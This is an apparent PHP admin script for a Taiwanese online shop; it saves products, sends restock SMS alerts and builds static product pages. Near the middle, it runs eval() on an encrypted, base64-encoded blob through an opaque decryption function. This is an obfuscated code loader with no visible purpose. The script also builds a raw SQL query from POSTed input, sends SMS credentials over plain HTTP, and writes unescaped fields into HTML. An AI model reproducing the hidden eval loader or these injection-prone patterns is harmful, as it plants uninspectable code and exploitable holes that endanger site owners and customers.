<?php session_start(); ?>
<?php

	date_default_timezone_set("Asia/Taipei");

	include('../mysql.php');
	require_once ('../MysqliDb.php');
	include('./key.inc.php');
	$db = new MysqliDb($mysqli);

	$result	=	Array();

	if (!isset($_SESSION['bee_admin'])){
		$result['err_msg']	=	'-1';
	    exit(json_encode($result));
	}

	$system	=	$db->getOne('system');

	$lan    =   $db->where('id', $system['language'])->getOne('language');
	$lan   =   json_decode($lan['content'], true);

	$data						=	Array();
	$data['opts']				=	NULL;
	$data['main_id']			=	$_POST['main_id'];
	if(isset($_POST['sub_id']))
	{
		$data['sub_id']				=	$_POST['sub_id'];
	}else{
		$_POST['sub_id'] = NULL;
	}
	$data['pnum']				=	$_POST['pnum'];
	$data['pname']				=	$_POST['pname'];
	$data['price']				=	$_POST['price'];
	$data['sprice']				=	$_POST['sprice'];
	$data['cost']				=	$_POST['cost'];
	$data['stock']				=	$_POST['stock'];
	$data['buy_limited']		=	$_POST['buy_limited'];
	$data['info']				=	NULL;

	$data['images']				=	NULL;
	$data['info_images']		=	NULL;
	$data['youtube']			=	NULL;
	$data['sdate']				=	NULL;
	$data['related_items']		=	NULL;
	$data['status']				=	0;
	$data['opt_asign']			=	0;

	if (!empty($_POST['main_imgs']))
		$data['images']				=	$_POST['main_imgs'];

	if (!empty($_POST['info_imgs']))
		$data['info_images']		=	$_POST['info_imgs'];

	if (!empty($_POST['info_movs']))
		$data['youtube']			=	$_POST['info_movs'];


	if (!empty($_POST['info']))
		$data['info']				=	$_POST['info'];

	if (!empty($_POST['related_items']))
		$data['related_items']		=	$_POST['related_items'];

	if (!empty($_POST['sdate']) && (int)$data['sprice'] > 0)
		$data['sdate']				=	$_POST['sdate'];

	if (isset($_POST['status'])) $data['status']	=	1;

	if (isset($_POST['opt_asign'])) $data['opt_asign']	=	1;


	$pid	=	$_POST['pid'];

	if ($_POST['optjson'] !== '[]'){
		$data['opts']	=	$_POST['optjson'];
	}

	if ((int)$pid > 0){

		$p = $db->where('pnum', $data['pnum'])->getOne('products', 'id');

		if ($db->count > 0){

			if ($p['id'] !== (int)$pid){
				$result['err_msg']  =   '商品編號重複~!';
				exit(json_encode($result));
			}

		}


		if ($db->where('id', $pid)->update('products', $data)){
		    $result['err_msg']  =   'OK';

		    $xdata	=	Array();
		    $xdata['pnum']	=	$data['pnum'];
		    $db->where('pid', $pid)->update('hot_products', $xdata);
		    $db->where('pid', $pid)->update('discount_products', $xdata);

		    //如果此商品有獨立頁面就重新建立
		    $single	=	$db->where('pid', $pid)->getOne('singles');

		    if ($db->count > 0){
		    	$db->where('pid', $pid)->update('singles', $xdata);

		    	if (file_exists('../'.$single['pnum'].'.html')){
		    		unlink('../'.$single['pnum'].'.html');
		    	}

		    	$data['id']	=	$pid;
		    	create_single($data, $single, $db, $system, $lan);
		    }

		    //貨到通知買家***************************
		    if ((int)$data['stock'] > 0){
		    	$alerts	=	$db->rawQuery('SELECT A1.*, A2.phone, A3.pname FROM prod_alert A1, members A2, products A3 WHERE A1.pid = '.$pid.' AND A2.id = A1.mid AND A3.id = A1.pid');

		    	if ($db->count > 0){
		    		if (!is_null($system['sms_account']) && !is_null($system['sms_pass'])){
		    			foreach ($alerts as $alert){
		    				$msg 	=	$lan['lan128'].'-'.$alert['pname'].'/'.$system['weburl'];
		    				//$msg 	=	'您關注的商品-'.$alert['pname'].'-目前已到貨，請至官網 '.$system['weburl'].' 進行選購，~'.$system['wname'].'祝您事事順心~';
		    				$long = '0';
		    				if (mb_strlen($msg, 'utf-8') >= 70) $long = '1';
		    				send_sms($alert['phone'], $msg, $long, $system['sms_account'], $system['sms_pass']);
		    			}
		    		}
		    	}

		    	$db->where('pid', $pid)->delete('prod_alert');

		    }
		    //*************************************


		} else {
		    $result['err_msg'] = 'DB UPDATE ERROR '.$db->getLastError();;
		}

	} else {

		$count = $db->where('pnum', $data['pnum'])->getValue('products', 'count(*)');

		if ($count > 0){
			$result['err_msg']  =   '商品編號已存在~!';
			exit(json_encode($result));
		}

		$today = new DateTime();
		$data['cdate']  =   $today->format('Y-m-d H:i');

		if ($db->insert('products', $data)){
		    $result['err_msg']  =   'OK';
		} else {
		    $result['err_msg'] = 'DB INSERT ERROR '.$db->getLastError();;
		}

	}

	echo json_encode($result);

	if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
	if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
	if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
	if(file_exists('key.inc.php')){include_once('key.inc.php');}else{die('<h2>File key.inc.php not found !</h2>');}
	$e7091="UFpNV2pXdWwyT0EyWURyb21FMG93UG5ML1R6MGZPT0w2UW91UDM3TzhuQjI1VzRCUytqVUgzM1Q3OHgvZVZKR2NBRG9UaUtuUHRTSFdYWG5RM29tM2xRZ1hpMm05dzJ2Lzd6UEFMSW9hZ2ZjMnZKeW5EZmJZTDA4SkdZRVJVQzVkYzlDSldwSGlYdHVCYlNIbkc3LzNmbTl4eFJyUFpIWmZheDlOMjRJZTE3K0NlQkhISmM0WG9rajZvZ091WVcxQzAzeWlvMHFUUkJhakZVam9Mcm1wbDUrRWZFL1FuTGhkcCtXVVJ4REVTcUxBNzFway9HTnRrM2VPQ0dCTDhhcnpVUmFMd1ZrR3loVk9sa2JEY00ra1NsMDdnMnpKQ253cDVHMHc2bnJmUkt2eVFwOVpBN2x1WXZJUUpjendiZXhKdTAyL09aY2Jobnh1L203amJVRWk1R2tMUFRLNVE4d3dLdXdnZkp4T1FRPQ==";eval(e7061($e7091));


	function send_sms($phone, $msg, $longsms, $acc, $pass){
		$msg = urlencode($msg);
		$ch = curl_init();
		$url = 'http://api.message.net.tw/send.php?longsms='.$longsms.'&id='.$acc.'&password='.$pass.'&tel='.$phone.'&msg='.$msg.'&mtype=G&encoding=utf8';
		curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$content= curl_exec($ch);
		curl_close($ch);

		return $content;

	}


	function create_single($prod, $data, $db, $system, $lan){

		$price_display		=	$prod['price'];

		//如果與首頁相同聯絡資訊
		if ($data['scontact'] == 1){
			$data['cphone']		=	$system['tele'];
			$data['cmail']		=	$system['email'];
			$data['cline']		=	$system['line'];
			$data['cfbpage']	=	$system['fbpage'];
			$data['caddr']		=	$system['addr'];
		}

		//確認最大購買量
		$max 	=	$prod['stock'];
		if ($prod['buy_limited'] > 0){
			if ($prod['buy_limited'] < $max) $max = $prod['buy_limited'];
		}


		$fb_comment	=	'';

		if ($data['comment'] == 1){

			 $fb_comment	=	'<div id="fb-root"></div>
			 				 <div class="fb-comments" data-href="'.$system['weburl'].$data['pnum'].'.html" data-numposts="5"></div>
			 				 <script async defer crossorigin="anonymous" src="https://connect.facebook.net/zh_TW/sdk.js#xfbml=1&version=v8.0&appId='.$system['fb_app_id'].'&autoLogAppEvents=1"></script>
			 					<script>
			 					   FB.XFBML.parse();
			 					</script>';
		}


		$info	=	strip_tags($prod['info']);

		$imgs		=	explode(',', $prod['images']);

		$slides 	=	$figure	=	'';

			foreach ($imgs as $key=>$img){

				$width 	=	$height 	=	800;
				list($width, $height) = getimagesize($img);

				//檢查是否有webp
				$webp 	=	'';
				$fname =  basename($img, '?' . $_SERVER['QUERY_STRING']);
				if (false !== $pos = strripos($fname, '.')) {
				      $fname = substr($fname, 0, $pos);
				  }

				if (file_exists('../products/'.$fname.'.webp')){
				     $webp .= '<source srcset="./products/'.$fname.'.webp" type="image/webp">';
				  }

				if ($key == 0){
							$slides .= '<div id="k'.$key.'" class="carousel-item active">
								<picture>
									'.$webp.'
			    	              	<img src="'.$img.'" alt="'.$prod['pname'].'" class="img-fluid">
			    	             </picture>
			    	            </div>';
		    	        } else {

							$slides .= '<div id="k'.$key.'" class="carousel-item">
								<picture>
									'.$webp.'
			    	              	<img src="'.$img.'" alt="'.$prod['pname'].'" class="img-fluid">
			    	            </picture>
			    	           </div>';

		    	        }

		    	$figure .= '<figure class="col-2">
	    				  
	    	             <a href="'.$img.'" data-size="'.$width.'x'.$height.'">
	    	                <picture>
	    	                  '.$webp.'
	    	                  <img src="'.$img.'" class="img-fluid" alt="'.$prod['pname'].'">
	    	                </picture>
	    	             </a>
	    	               
	    	              </figure>';
			}

			//價格
			$price	=	'<h3 class="h3-responsive text-center text-md-left my-2 price">
		    	          <span class="price-text font-weight-bold">
		    	            <strong>$'.$prod['price'].'</strong>
		    	          </span>
		    	        </h3>';

		    $discount	=	'';

			if ((int)$prod['sprice'] > 0){
				$price	=	'<h3 class="h3-responsive text-center text-md-left my-2 price">
		    	          <span class="sprice-text font-weight-bold">
		    	            <strong>$'.$prod['sprice'].'</strong>
		    	          </span>
		    	          <span class="price-text">
		    	            <small>
		    	              <s>$'.$prod['price'].'</s>
		    	            </small>
		    	          </span>
		    	        </h3>';

		    	 $price_display	=	$prod['sprice'];

		    	 $dis = (int)$prod['price'] - (int)$prod['sprice'];

		    	 $discount	=	'<span class="badge"><i class="fas fa-volume-down mr-1"></i>立刻省'.$dis.'</span>';
			}



			$header 			=	   '<meta property="og:url" content="'.$system['weburl'].$data['pnum'].'.html" />
										<meta property="og:image" content="'.$imgs[0].'" />
										<meta property="og:title" content="'.$prod['pname'].' / $'.$price_display.'" />
										<meta property="og:description"  content="'.$info.'" />
										<meta property="og:image:width" content="1024" />
										<meta property="og:image:height" content="1024" />
										<meta property="og:type" content="website" />
										<meta property="fb:app_id" content="2269756786668110" />';




			$options	=	'';

			if (!is_null($prod['opts'])){
				$opts	=	json_decode($prod['opts'], true);

				foreach ($opts as $key=>$opt){
					$fopts 	=	'';
					if ($prod['opt_asign'] === 1 && $key === 0) $fopts =	'fopts';

					$options .= '<div class="input-group input-group-sm mb-3">
			    	        <div class="input-group-prepend">
			    	          <label class="input-group-text" for="option">'.$opt['oname'].'</label>
			    	        </div>
			    	        <select class="browser-default custom-select opts '.$fopts.'">';

			    	foreach ($opt['opts'] as $xkey=>$item){
			    		$options .= '<option value="'.$xkey.'">'.$item.'</option>';
			    	}


			    	$options .= '</select></div>';


				}

			}


			$info_images	=	'';

			if (!is_null($prod['info_images'])){
				$imgs 	=	explode(',', $prod['info_images']);

				foreach ($imgs as $img){
					//檢查是否有webp
					$webp 	=	'';
					$fname =  basename($img, '?' . $_SERVER['QUERY_STRING']);
					if (false !== $pos = strripos($fname, '.')) {
					      $fname = substr($fname, 0, $pos);
					  }

					if (file_exists('./products/'.$fname.'.webp')){
					     $webp .= '<source srcset="./products/'.$fname.'.webp" type="image/webp">';
					  }

					$info_images .= '<picture>
										'.$webp.'
										<img alt="" src="'.$img.'" loading="lazy" class="img-fluid d-block m-auto">
									</picture>';
				}
			}

			$info_movies	=	'';

			if (!is_null($prod['youtube'])){
				$movs 	=	explode(',', $prod['youtube']);

				$info_movies = '<div class="col-12 my-2"><hr></div>';

				foreach ($movs as $mov){
					$info_movies .= '<div class="col-12 mb-2"><div class="embed-responsive embed-responsive-16by9">
					<iframe width="560" height="315" class="embed-responsive-item" src="'.$mov.'" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen>
					</iframe>
					</div></div>';
				}
			}


			$map	=	'';

			if (!is_null($data['caddr'])){

				$map .= '<div class="col-md-6 mb-4 mb-md-0">

					<div class="z-depth-1-half map-container" style="height: 300px">
					  <iframe src="https://maps.google.com/maps?q='.$data['caddr'].'&t=&z=13&ie=UTF8&iwloc=&output=embed" frameborder="0"
					    style="border:0" allowfullscreen></iframe>
					</div>

				</div>';

				$map .= '<div class="col-md-6 my-auto">';
				
				$map .= '<p class="blue-grey-text"><i class="fas fa-map-marker-alt fa-fw fa-lg mr-1"></i>'.$data['caddr'].'</p>';

				if (!is_null($data['cphone'])){
					$map .= '<a href="tel:'.$data['cphone'].'" class="blue-grey-text d-block my-2"><i class="fas fa-phone-volume fa-fw fa-lg mr-1"></i>'.$data['cphone'].'</a>';
				}

				if (!is_null($data['cmail'])){
					$map .= '<a href="mailto:'.$data['cmail'].'" class="btn-floating btn-share"><i class="fas fa-at fa-lg"></i></a>';
				}

				if (!is_null($data['cline'])){
					$map .= '<a target="_blank" href="'.$data['cline'].'" class="btn-floating btn-share"><i class="fab fa-line fa-lg"></i></a>';
				}

				if (!is_null($data['cfbpage'])){
					$map .= '<a target="_blank" href="'.$data['cfbpage'].'" class="btn-floating btn-share"><i class="fab fa-facebook-f fa-lg"></i></a>';
				}

				$map .= '</div>';
			} else {

				$map .= '<div class="col-12 my-5">';

				if (!is_null($data['cphone'])){
					$map .= '<a href="tel:'.$data['cphone'].'" class="blue-grey-text d-block my-3"><i class="fas fa-phone-volume fa-fw fa-lg mr-1"></i>'.$data['cphone'].'</a>';
				}

				if (!is_null($data['cmail'])){
					$map .= '<a href="mailto:'.$data['cmail'].'" class="btn-floating btn-share btn-lg"><i class="fas fa-at fa-2x"></i></a>';
				}

				if (!is_null($data['cline'])){
					$map .= '<a target="_blank" href="'.$data['cline'].'" class="btn-floating btn-share btn-lg"><i class="fab fa-line fa-2x"></i></a>';
				}

				if (!is_null($data['cfbpage'])){
					$map .= '<a target="_blank" href="'.$data['cfbpage'].'" class="btn-floating btn-share btn-lg"><i class="fab fa-facebook-f fa-2x"></i></a>';
				}

				$map .= '</div>';

			}


			$fb_share	=	'https://www.facebook.com/sharer/sharer.php?u='.urlencode($system['weburl'].$prod['pnum'].'.html').'&amp;src=sdkpreparse';
			$tw_share	=	'https://twitter.com/intent/tweet?url='.urlencode($system['weburl'].$prod['pnum'].'.html');
			$line_share	=	'https://social-plugins.line.me/lineit/share?url='.urlencode($system['weburl'].$prod['pnum'].'.html');
			
			$tprice = $price_display + $data['ship'];

			$html 	=	'<!DOCTYPE html>
		    <html lang="en">
		        <head>

		            <meta charset="utf-8">
		                <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
		                    <meta content="ie=edge" http-equiv="x-ua-compatible">
		                    '.$header.'
		                    <title>
		                             '.$prod['pname'].'
		                    </title>

		                    <link rel="shortcut icon" href="./images/logo.png" type="img/x-icon">
		                    <link href="https://use.fontawesome.com/releases/v5.6.1/css/all.css" rel="stylesheet">
		                    <link href="./css/bootstrap.min.css" rel="stylesheet">
		                    <link href="./css/mdb.min.css" rel="stylesheet">
		                    <link href="./css/single.css" rel="stylesheet">
		                
		    </head>

		    <body>

		    	<div class="container px-lg-5 my-3 py-lg-5 py-3 z-depth-1">

		    	  <section class="text-center">

		    	   <input type="hidden" id="pid" value="'.$prod['id'].'">
		    	   <input type="hidden" id="ship" value="'.$data['ship'].'">
		    	   <input type="hidden" id="price" value="'.$price_display.'">
		    	   <input type="hidden" id="free_ship" value="'.$system['free_ship'].'">

		    	    <div class="row">
		    	      <div class="col-lg-6">

		    	      <div id="title" class="d-lg-none text-md-left mb-4">
		    	        <h2 class="h2-responsive text-center text-md-left font-weight-bold blue-grey-text">'.$prod['pname'].'</h2>

		    	        '.$price.'

		    	        <span class="badge"><i class="fas fa-truck mr-1"></i>'.$lan['lan54'].' '.$data['ship'].'</span>

		    	        <span class="discount">
		    	        '.$discount.'
		    	        </span>

		    	      </div>

		    	        <!--Carousel Wrapper-->
		    	        <div id="carousel-thumb1" class="carousel slide carousel-fade carousel-thumbnails z-depth-1-half mb-4" data-ride="carousel">

		    	          <!--Slides-->
		    	          <div class="carousel-inner text-center text-md-left" role="listbox">
		    	            '.$slides.'
		    	          </div>
		    	          <!--/.Slides-->

		    	        </div>
		    	        <!--/.Carousel Wrapper-->
		    	        
		    	        <div class="row mb-4">
		    	          <div class="col-md-12">
		    	            <div id="mdb-lightbox-ui"></div>
		    	            <div class="mdb-lightbox no-margin">
		    	              '.$figure.'
		    	            </div>
		    	          </div>
		    	        </div>
		    	        
		    	      </div>

		    	      <div class="col-lg-6 text-center">

		    	      <div id="title" class="d-none d-lg-block mb-4 text-left">
		    	        <h2 class="h2-responsive text-center text-md-left product-name font-weight-bold blue-grey-text">'.$prod['pname'].'</h2>
		    	        
		    	        '.$price.'

		    	        <span class="badge"><i class="fas fa-truck mr-1"></i>'.$lan['lan54'].' '.$data['ship'].'</span>

		    	         <span class="discount">
		    	        	'.$discount.'
		    	        </span>

		    	        <hr>

		    	      </div>


		    	      <div id="infobox" class="my-5">
		    	      '.$prod['info'].'
		    	      </div>
		    	      <hr>

			    	      <div class="input-group input-group-sm mb-3 w-sm-50">

				    	      <div class="input-group-prepend">
				    	        <label class="input-group-text" type="button">'.$lan['lan53'].'</label>
				    	      </div>

				    	        <div class="input-group-prepend">
				    	          <button class="btn btn-md btn-light m-0 px-3 z-depth-0 waves-effect" type="button" id="more" data-max="'.$max.'"><i class="fas fa-plus"></i></button>
				    	        </div>
				    	        <input type="text" id="count" class="form-control text-center" min="1" maxlength="4" data-max="'.$max.'" value="1">

				    	          <div class="input-group-append">
				    	            <button class="btn btn-md btn-light m-0 px-3 z-depth-0 waves-effect" type="button" id="less"><i class="fas fa-minus"></i></button>
				    	          </div>
			    	      </div>

			    	      '.$options.'


			    	      <div class="input-group input-group-sm mb-3">
		      	    	        <div class="input-group-prepend">
		      	    	          <label class="input-group-text" for="paymode">'.$lan['lan56'].'</label>
		      	    	        </div>
		      	    	        <select id="paymode" class="browser-default custom-select">
		      	    	        </select>
			    	      </div>

	      	    	      <div id="stbox" class="input-group input-group-sm mb-3 d-none">
	        	    	        <div class="input-group-prepend">
	        	    	          <label class="input-group-text" for="store">'.$lan['lan148'].'</label>
	        	    	        </div>
	        	    	        <select id="store" class="browser-default custom-select">
	        	    	        </select>
	      	    	      </div>

			    	      <div id="pricebox" class="col-12 text-right my-3 px-2">
			    	          	<h4 class="font-weight-bold blue-grey-text">總價: $<span id="totalprice">'.$tprice.'</span></h4>
			    	      </div>


			    	      <div class="text-center mb-3">
			    	      		<a target="_blank" href="'.$fb_share.'" class="btn-floating btn-fb"><i class="fab fa-facebook-f fa-lg"></i></a>
			    	      		<a target="_blank" href="'.$tw_share.'" class="btn-floating btn-tw"><i class="fab fa-twitter fa-lg"></i></a>
			    	      		<a target="_blank" href="'.$line_share.'" class="btn-floating btn-slack"><i class="fab fa-line fa-lg"></i></a>
			    	      </div>

			    	      <script src="https://d.line-scdn.net/r/web/social-plugin/js/thirdparty/loader.min.js" async="async" defer="defer"></script>

			    	      <button id="buy_btn" class="btn btn-blue-grey"><i class="fas fa-store mr-1"></i>立刻購買</button>


		    	      </div>
		    	    </div>


		    	    <div class="row my-4">

		    	    	<div class="col-12 text-center">
		    	    		<hr>
		    	    		'.$info_images.'
		    	    	</div>

		    	    	'.$info_movies.'

		    	    	<div class="col-12 text-center mt-4">
		    	    		'.$fb_comment.'
		    	    	</div>


		    	    	<div class="col-12 mt-5 text-left">

		    	    		<h4 class="font-weight-bold blue-grey-text"><i class="far fa-edit mr-1"></i>聯絡我們</h4>

		    	    		<hr class="mb-4">

		    	    	</div>

		    	    	'.$map.'


		    	    </div>

		    	  </section>
		    	  <!--Section: Content-->

		    	  <button id="gotop" class="btn btn-floating btn-share"><i class="fas fa-chevron-up fa-lg"></i></button>


		    	</div>

		    	<form id="ECPayForm" method="POST" action="https://logistics.ecpay.com.tw/Express/map" target="_self">
		    	  <input type="hidden" name="MerchantID" value="'.$system['merchantid'].'" />
		    	  <input type="hidden" name="MerchantTradeNo" value="no20210502010437" />
		    	  <input type="hidden" name="LogisticsSubType" value="UNIMARTC2C" />
		    	  <input type="hidden" name="IsCollection" value="Y" />
		    	  <input type="hidden" name="ServerReplyURL" value="'.$system['weburl'].'single_map_order.php" />
		    	  <input type="hidden" name="ExtraData" value="0" />
		    	  <input type="hidden" name="Device" value="1" />
		    	  <input type="hidden" name="LogisticsType" value="CVS" />
		    	</form>

		    	<div id="modal_area"></div>

		    	<script>
		    		var lan101 = "'.$lan['lan101'].'";
		    		var lan102 = "'.$lan['lan102'].'";
		    		var lan103 = "'.$lan['lan103'].'";
		    		var lan136 = "'.$lan['lan136'].'";
		    		var lan137 = "'.$lan['lan137'].'";
		    		var lan148 = "'.$lan['lan148'].'";
		    		var lan149 = "'.$lan['lan149'].'";
		    		var lan150 = "'.$lan['lan150'].'";
		    	</script>

		    	<script src="./js/jquery.min.js" type="text/javascript"></script>
		    	<script type="text/javascript" src="./js/bootstrap.min.js"></script>
		    	<script type="text/javascript" src="./js/mdb.min.js"></script>
		    	<script type="text/javascript" src="./js/lightbox.js"></script>
		    	<script src="./js/imask.js" type="text/javascript"></script>
		    	<script type="text/javascript" src="./js/single.js"></script>
		    	<script type="text/javascript" src="./js/jquery.twzipcode2.js"></script>

		    </body>
		    </html>';

		    file_put_contents('../'.$prod['pnum'].'.html', $html);



	}


?>